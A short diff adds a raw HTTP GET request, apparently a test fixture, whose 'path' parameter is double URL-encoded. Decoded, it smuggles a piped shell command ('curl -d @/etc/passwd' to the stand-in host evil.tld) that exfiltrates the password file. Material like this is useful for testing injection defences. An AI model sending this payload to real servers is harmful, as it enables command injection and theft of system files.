@@ -1,0 +1,4 @@
+GET /a?path=%257C%2Bcurl%2B-d%2B%2540%252Fetc%252Fpasswd%2Bhttp%253A%252F%252Fevil.tld HTTP/1.1
+Host: demo.example.com
+Connection: close
+
